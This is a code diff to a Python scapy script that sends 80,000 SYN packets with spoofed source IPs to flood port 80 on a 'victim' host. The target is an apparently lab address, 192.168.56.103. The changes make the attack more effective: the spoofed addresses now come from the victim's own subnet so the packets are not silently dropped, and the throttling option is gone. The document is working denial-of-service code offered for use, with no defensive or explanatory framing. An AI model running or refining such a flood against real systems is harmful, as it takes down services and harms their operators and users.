@@ -2,23 +2,20 @@
 
 from scapy.all import IP, TCP, send
 import random
-import time
 
-# ⚠️ Update this to your actual victim's IP
+# Victim's IP and target port (Apache default port)
 TARGET_IP = "192.168.56.103"
 TARGET_PORT = 80
 
-# Total number of spoofed SYN packets
+# Number of spoofed SYN packets to send
 PACKET_COUNT = 80000
 
-# 0 = full speed. You can use 0.001 or 0.0001 for throttling.
-DELAY = 0
-
-print(f"[+] Starting TCP SYN Flood DoS attack on {TARGET_IP}:{TARGET_PORT}")
+print(f"[+] Starting TCP SYN Flood with IP Spoofing on {TARGET_IP}:{TARGET_PORT}")
 print(f"[+] Sending {PACKET_COUNT} spoofed SYN packets...\n")
 
 for i in range(PACKET_COUNT):
-    spoofed_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
+    # Spoof IP from same subnet as victim to avoid silent drop
+    spoofed_ip = f"192.168.56.{random.randint(1, 254)}"
     sport = random.randint(1024, 65535)
     seq = random.randint(0, 4294967295)
 
@@ -29,9 +26,6 @@ for i in range(PACKET_COUNT):
     send(pkt, verbose=0)
 
     if (i + 1) % 1000 == 0:
-        print(f"[+] {i + 1} packets sent")
-
-    if DELAY > 0:
-        time.sleep(DELAY)
+        print(f"[+] Sent {i + 1} packets")
 
 print("\n[+] Attack completed.")
